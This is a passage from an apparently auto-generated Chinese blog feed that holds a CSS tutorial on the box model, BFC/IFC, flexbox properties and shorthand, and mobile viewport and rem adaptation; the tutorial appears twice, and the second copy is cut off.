float</em><br>其实不是清楚浮动的意思，而是找一个干净的空间来执行浮动。避免多个相邻的浮动元素堆叠在一行</li><li><em>margun折叠</em><br>只是要求周围有这么多的空白，就是一个合理的排版。而不会说跟别的边距也有这么多空白。只有正常流的BFC会发生margin折叠的现象，其他flex等布局不会发生。</li></ul></li></ul></li><li>计算行的排布</li></ol><p><br></p><h3 id="3-flex"><a href="#3-flex" class="headerlink" title="3. flex"></a>3. flex</h3><p>flex 容器中默认存在两条轴：</p><ul><li>水平主轴 main axis</li><li>垂直交叉轴 cross axis</li></ul><p><img src="/2021/08/16/盒模型/1.jpg"><br>在容器中的每个单元块被称之为 flex item，每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size)。不能先入为主认为宽度就是 main size，高度就是 cross size，取决于<code>flex-direction</code>的取值）</p><p><br></p><h4 id="3-1-flex-容器"><a href="#3-1-flex-容器" class="headerlink" title="3.1 flex 容器"></a>3.1 flex 容器</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex | inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置 flex 布局后，子元素的 float、clear、vertical-align 的属性将会失效。</p><p>有下面六种属性可以设置在容器上，它们分别是：</p><ol><li>flex-direction：决定主轴的方向 row | row-reverse | column | column-reverse</li><li>flex-wrap：决定容器内item是否可换行 nowrap(不换行) | wrap | wrap-reverse(换行，第一行在下方)</li><li>flex-flow：flex-direction 和 flex-wrap 的简写形式，默认值为: row nowrap</li><li>justify-content：item在主轴的对齐方式 flex-start | flex-end | center | space-between | space-around</li><li>align-items：item在交叉轴上的对齐方式，默认值为 stretch，即如果项目未设置高度或者设为 auto，将占满整个容器的高度。flex-start | flex-end | center | baseline(项目的第一行文字的基线对齐) | stretch</li><li>align-content：确定容器中存在多行情况下，在交叉轴上，行间对齐方式。默认值为 stretch，如果项目只有一根轴线，那么该属性将不起作用 flex-start | flex-end | center | space-between | space-around | stretch<ul><li>当 flex-wrap 设置为 nowrap 的时候，容器仅存在一根轴线，因为项目不会换行，就不会产生多条轴线。</li><li>当 flex-wrap 设置为 wrap 的时候，容器可能会出现多条轴线，这时候你就需要去设置多条轴线之间的对齐方式了。</li></ul></li></ol><p><br></p><h4 id="3-2-flex-item属性"><a href="#3-2-flex-item属性" class="headerlink" title="3.2 flex item属性"></a>3.2 flex item属性</h4><p>有六种属性可运用在 item 项目上：</p><ol><li>order：项目在容器中的排列顺序，数值越小，排列越靠前，默认值为 0，可为负数</li><li>flex-basis：在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间，默认为 auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值。<ul><li>当主轴为水平方向的时候，当设置了 flex-basis，项目的宽度设置值会失效，flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果。</li></ul></li><li>flex-grow：项目的放大比例，默认值为 0，即如果存在剩余空间，也不放大。<br>当所有的项目都以 flex-basis 的值进行排列后，仍有剩余空间，那么这时候 flex-grow 就会发挥作用了。</li><li>flex-shrink：项目的缩小比例，默认值为 1，即如果空间不足，该项目将缩小，负值对该属性无效。</li><li>flex：flex-grow, flex-shrink 和 flex-basis 的简写，默认值是 0 1 auto。<br>有关快捷值：auto (1 1 auto) 和 none (0 0 auto)</li><li>align-self：允许单个项目有与其他项目不一样的对齐方式，默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。auto | flex-start | flex-end | center | baseline | stretch</li></ol><p><br></p><h4 id="3-3-flex-简写"><a href="#3-3-flex-简写" class="headerlink" title="3.3 flex 简写"></a>3.3 flex 简写</h4><p><em>公式：</em></p><ul><li>x 非负时，flex: x → flex: x 1 0%</li><li>x 为长度(px)或百分比时，flex: x → flex: 1 1 x</li><li>x 和 y 都非负时，flex: x y → flex: x y 0%</li><li>x 非负数字、y 是一个长度或百分比时，flex: x y → flex: x 1 y</li></ul><p><em>举例：</em><br>当 flex 取值为一个非负数字，则该数字为 flex-grow 值，flex-shrink 取 1，flex-basis 取 0%，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为 0 时，对应的三个值分别为 0 1 0%：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为一个长度或百分比，则视为 flex-basis 值，flex-grow 取 1，flex-shrink 取 1，有如下等同情况（注意 0% 是一个百分比而不是一个非负数字）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;<span class="attribute">flex</span>: <span class="number">0%</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item-2</span> &#123;<span class="attribute">flex</span>: <span class="number">24px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为两个非负数字，则分别视为 flex-grow 和 flex-shrink 的值，flex-basis 取 0%，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">2</span> <span class="number">3</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为一个非负数字和一个长度或百分比，则分别视为 flex-grow 和 flex-basis 的值，flex-shrink 取 1，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">11</span> <span class="number">32px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">11</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。shrink 在 flex 容器下的子元素的宽度总和比容器小的时候起作用。 grow 定义了子元素的尺寸增长因子，容器中除去子元素之和剩下的尺寸会按照各个子元素的 grow 值进行平分加大各个子元素上。</p><p><br></p><h4 id="3-4-flex-wrap、flex-shrink、flex-grow的关系"><a href="#3-4-flex-wrap、flex-shrink、flex-grow的关系" class="headerlink" title="3.4 flex-wrap、flex-shrink、flex-grow的关系"></a>3.4 flex-wrap、flex-shrink、flex-grow的关系</h4><p>容器的 flex-wrap 与子项的 flex-shrink、flex-grow 之间的关系</p><ol><li>当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大）</li><li>当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和超过父容器宽度时，首先一定会换行，换行后，每一行的右端都可能会有剩余空间（最后一行包含的子项可能比前几行少，所以剩余空间可能会更大），这时 flex-grow 会起作用，若当前行所有子项的 flex-grow 都为0，则剩余空间保留，若当前行存在一个子项的 flex-grow 不为0，则剩余空间会被 flex-grow 不为0的子项占据</li><li>当 flex-wrap 为 nowrap，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大）</li><li>当 flex-wrap 为 nowrap，且子项宽度和超过父容器宽度时，flex-shrink 会起作用，子项会根据 flex-shrink 设定的值进行缩小（为0的项不缩小）。但这里有一个较为特殊情况，就是当这一行所有子项 flex-shrink 都为0时，也就是说所有的子项都不能缩小，就会出现讨厌的横向滚动条</li><li>总结上面四点，可以看出不管在什么情况下，在同一时间，flex-shrink 和 flex-grow 只有一个能起作用，这其中的道理细想起来也很浅显：空间足够时，flex-grow 就有发挥的余地，而空间不足时，flex-shrink 就能起作用。当然，flex-wrap 的值为 wrap | wrap-reverse 时，表明可以换行，既然可以换行，一般情况下空间就总是足够的，flex-shrink 当然就不会起作用</li></ol><p><br></p><h4 id="3-5-flex宽度计算"><a href="#3-5-flex宽度计算" class="headerlink" title="3.5 flex宽度计算"></a>3.5 flex宽度计算</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  * &#123;</span></span><br><span class="line"><span class="undefined">    padding: 0;</span></span><br><span class="line"><span class="undefined">    margin: 0;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 600px;</span></span><br><span class="line"><span class="undefined">    height: 300px;</span></span><br><span class="line"><span class="undefined">    display: flex;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 1 2 500px;</span></span><br><span class="line"><span class="undefined">    background: red;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 2 1 400px;</span></span><br><span class="line"><span class="undefined">    background: blue;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">子元素的 flex-shrink 的值分别为 2，1</span><br><span class="line">溢出：500+400 - 600 = 300。</span><br><span class="line">总权重为 2 * 500+ 1 * 400 = 1400</span><br><span class="line">两个元素分别收缩：</span><br><span class="line">300 * 2(flex-shrink) * 500(width) / 1400= 214.28</span><br><span class="line">300 * 1(flex-shrink) * 400(width) / 1400= 85.72</span><br><span class="line">三个元素的最终宽度分别为：</span><br><span class="line">500 - 214.28 = 285.72</span><br><span class="line">400 - 85.72 = 314.28</span><br></pre></td></tr></table></figure><p>收缩：子项宽度 - 移除宽度 <em> 子项收缩<strong>权重比例</strong>（自身宽度 </em> shrink / 总权重）<br>拉伸与收缩算法不一样：子项宽度 + 剩余宽度 * 子项拉伸比例</p><p><br></p><p><br></p><h3 id="5-移动端适配"><a href="#5-移动端适配" class="headerlink" title="5. 移动端适配"></a>5. 移动端适配</h3><h4 id="5-1-meta-viewport适配"><a href="#5-1-meta-viewport适配" class="headerlink" title="5.1 meta-viewport适配"></a>5.1 meta-viewport适配</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0, minimun-scale=1.0, maximum-scale=1.0, user-scalable=no"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>其中 device-width 意思是设备宽度</p><ul><li>width：属性控制视口的宽度，可以设置具体的宽度如：<code>width=700</code>，但是一般这么使用，都是使用 <code>width=device-width</code></li><li>inital-scale：页面初始缩放值，默认为 1；</li><li>maximum-scale：允许用户缩放到的最大比例。</li><li>minimum-scale：允许用户缩放到的最小比例。</li><li>user-scalable：用户是否可以手动缩放。</li></ul><p>为了能在移动设备上正常显示那些传统的为桌面浏览器设计的网站，移动设备上的浏览器都会把自己默认的viewport设为980px或1024px（也可能是其它值，这个是由设备自己决定的），这样做是因为许多页面没有做移动端优化，在小窗口渲染时会乱掉（或看起来乱）。所以，这种虚拟视口是一种让未做移动端优化的网站在窄屏设备上看起来更好的办法。</p><p><br></p><h4 id="5-2-媒体查询"><a href="#5-2-媒体查询" class="headerlink" title="5.2 媒体查询"></a>5.2 媒体查询</h4><p><em><code>@media</code></em>查询针对不同的屏幕尺寸设置不同的样式，当要设置响应式页面时，还是很有用的。当你重置浏览器大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面。</p><p><br></p><h4 id="5-3-em-rem-vw-vh"><a href="#5-3-em-rem-vw-vh" class="headerlink" title="5.3 em, rem, vw, vh"></a>5.3 em, rem, vw, vh</h4><p>em和rem都是相对单位长度</p><ul><li>em是相对父级font-size变化的，如果嵌套过深，计算会比较繁琐，因此一般大范围不适用，小范围可结合px单位使用。</li><li>rem是相对html根元素font-size变化的，没有em的繁琐计算，配合动态计算rem的js代码，rem在移动端布局中很受欢迎<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> doc = win.document;</span><br><span class="line"><span class="keyword">var</span> docEl = doc.documentElement;</span><br><span class="line"><span class="keyword">var</span> tid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refreshRem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> width = docEl.getBoundingClientRect().width;        </span><br><span class="line"><span class="keyword">if</span> (width &gt;=<span class="number">750</span>) width = <span class="number">750</span>;</span><br><span class="line"><span class="keyword">if</span>(width&lt;=<span class="number">320</span>) width=<span class="number">320</span>;</span><br><span class="line"><span class="keyword">var</span> rem = width / <span class="number">7.5</span>;</span><br><span class="line">docEl.style.fontSize = rem + <span class="string">'px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">win.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clearTimeout(tid);</span><br><span class="line">tid = setTimeout(refreshRem, <span class="number">300</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">refreshRem();</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/6844903591149305864" target="_blank" rel="noopener">Flex 排版源码分析</a></li><li><a href="https://juejin.cn/post/6844903817503326216" target="_blank" rel="noopener">移动端三种适配方案</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/2021/08/16/flex/"/>
      <url>/2021/08/16/flex/</url>
      <content type="html"><![CDATA[<hr><p>title: 盒模型、正常流、flex，移动端适配<br>date: 2021-08-13 00:16:04</p><h2 id="category-CSS"><a href="#category-CSS" class="headerlink" title="category: CSS"></a>category: CSS</h2><h3 id="1-盒模型"><a href="#1-盒模型" class="headerlink" title="1. 盒模型"></a>1. 盒模型</h3><p>HTML标签中可以书写开始标签、结束标签和自封闭标签。一对起止标签，表示一个元素。DOM树中存储的是元素和其他类型的节点。CSS选择器选中的是<em>元素</em>。</p><p>元素在排版时可能产生多个<em>盒</em>。排版和渲染的基本单位是<em>盒</em>。一个元素可能会产生多个盒。如<em>inline</em>元素因为分行而产生多个盒。<em>被伪元素选中的元素</em>也会产生多个盒。</p><p>每个元素被表示为一个矩形的方框，框的内容、内边距、边界、外边距一层层构建起来。浏览器渲染网页布局时，会算出每个框每一层要用什么样式，以及框放在哪里。<br><em><code>box-sizing</code></em></p><ul><li>content-box：<code>element width = border + padding + content width</code></li><li>border-box：<code>element width = content width</code>(内容宽度包含了content width，border, padding, 建议使用)</li></ul><p><br></p><h3 id="2-正常流，BFC，IFC"><a href="#2-正常流，BFC，IFC" class="headerlink" title="2. 正常流，BFC，IFC"></a>2. 正常流，BFC，IFC</h3><p>HTML最早的排版设计，从文字出版行业的专家来做。思考一下，我们如何写字？1.从左到右书写； 2. 同一行写的文字都是对齐的；3. 一行写满了，就换到下一行。<strong>这也对应了正常流排版过程:</strong></p><ol><li>收集盒</li><li>计算盒在行中的排布<ul><li>行内盒遵循<em>IFC</em>(inline formatting contexts) 内联格式上下文<br>从左到右排列，排不下，放下一行。Baseline基线来决定行内元素如何对齐。</li><li>块状盒遵循<em>BFC</em>(Block formatting contexts) 块级格式上下文<br>从上到下依次排布。BFC合并会发生什么？<ul><li><em>clear float</em><br>其实不是清楚浮动的意思，而是找一个干净的空间来执行浮动。避免多个相邻的浮动元素堆叠在一行</li><li><em>margun折叠</em><br>只是要求周围有这么多的空白，就是一个合理的排版。而不会说跟别的边距也有这么多空白。只有正常流的BFC会发生margin折叠的现象，其他flex等布局不会发生。</li></ul></li></ul></li><li>计算行的排布</li></ol><p><br></p><h3 id="3-flex"><a href="#3-flex" class="headerlink" title="3. flex"></a>3. flex</h3><p>flex 容器中默认存在两条轴：</p><ul><li>水平主轴 main axis</li><li>垂直交叉轴 cross axis</li></ul><p><img src="/2021/08/16/flex/1.jpg"><br>在容器中的每个单元块被称之为 flex item，每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size)。不能先入为主认为宽度就是 main size，高度就是 cross size，取决于<code>flex-direction</code>的取值）</p><p><br></p><h4 id="3-1-flex-容器"><a href="#3-1-flex-容器" class="headerlink" title="3.1 flex 容器"></a>3.1 flex 容器</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex | inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置 flex 布局后，子元素的 float、clear、vertical-align 的属性将会失效。</p><p>有下面六种属性可以设置在容器上，它们分别是：</p><ol><li>flex-direction：决定主轴的方向 row | row-reverse | column | column-reverse</li><li>flex-wrap：决定容器内item是否可换行 nowrap(不换行) | wrap | wrap-reverse(换行，第一行在下方)</li><li>flex-flow：flex-direction 和 flex-wrap 的简写形式，默认值为: row nowrap</li><li>justify-content：item在主轴的对齐方式 flex-start | flex-end | center | space-between | space-around</li><li>align-items：item在交叉轴上的对齐方式，默认值为 stretch，即如果项目未设置高度或者设为 auto，将占满整个容器的高度。flex-start | flex-end | center | baseline(项目的第一行文字的基线对齐) | stretch</li><li>align-content：确定容器中存在多行情况下，在交叉轴上，行间对齐方式。默认值为 stretch，如果项目只有一根轴线，那么该属性将不起作用 flex-start | flex-end | center | space-between | space-around | stretch<ul><li>当 flex-wrap 设置为 nowrap 的时候，容器仅存在一根轴线，因为项目不会换行，就不会产生多条轴线。</li><li>当 flex-wrap 设置为 wrap 的时候，容器可能会出现多条轴线，这时候你就需要去设置多条轴线之间的对齐方式了。</li></ul></li></ol><p><br></p><h4 id="3-2-flex-item属性"><a href="#3-2-flex-item属性" class="headerlink" title="3.2 flex item属性"></a>3.2 flex item属性</h4><p>有六种属性可运用在 item 项目上：</p><ol><li>order：项目在容器中的排列顺序，数值越小，排列越靠前，默认值为 0，可为负数</li><li>flex-basis：在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间，默认为 auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值。<ul><li>当主轴为水平方向的时候，当设置了 flex-basis，项目的宽度设置值会失效，flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果。</li></ul></li><li>flex-grow：项目的放大比例，默认值为 0，即如果存在剩余空间，也不放大。<br>当所有的项目都以 flex-basis 的值进行排列后，仍有剩余空间，那么这时候 flex-grow 就会发挥作用了。</li><li>flex-shrink：项目的缩小比例，默认值为 1，即如果空间不足，该项目将缩小，负值对该属性无效。</li><li>flex：flex-grow, flex-shrink 和 flex-basis 的简写，默认值是 0 1 auto。<br>有关快捷值：auto (1 1 auto) 和 none (0 0 auto)</li><li>align-self：允许单个项目有与其他项目不一样的对齐方式，默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。auto | flex-start | flex-end | center | baseline | stretch</li></ol><p><br></p><h4 id="3-3-flex-简写"><a href="#3-3-flex-简写" class="headerlink" title="3.3 flex 简写"></a>3.3 flex 简写</h4><p><em>公式：</em></p><ul><li>x 非负时，flex: x → flex: x 1 0%</li><li>x 为长度(px)或百分比时，flex: x → flex: 1 1 x</li><li>x 和 y 都非负时，flex: x y → flex: x y 0%</li><li>x 非负数字、y 是一个长度或百分比时，flex: x y → flex: x 1 y</li></ul><p><em>举例：</em><br>当 flex 取值为一个非负数字，则该数字为 flex-grow 值，flex-shrink 取 1，flex-basis 取 0%，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为 0 时，对应的三个值分别为 0 1 0%：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为一个长度或百分比，则视为 flex-basis 值，flex-grow 取 1，flex-shrink 取 1，有如下等同情况（注意 0% 是一个百分比而不是一个非负数字）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;<span class="attribute">flex</span>: <span class="number">0%</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item-2</span> &#123;<span class="attribute">flex</span>: <span class="number">24px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为两个非负数字，则分别视为 flex-grow 和 flex-shrink 的值，flex-basis 取 0%，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">2</span> <span class="number">3</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flex 取值为一个非负数字和一个长度或百分比，则分别视为 flex-grow 和 flex-basis 的值，flex-shrink 取 1，如下是等同的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">11</span> <span class="number">32px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">11</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。shrink 在 flex 容器下的子元素的宽度总和比容器小的时候起作用。 grow 定义了子元素的尺寸增长因子，容器中除去子元素之和剩下的尺寸会按照各个子元素的 grow 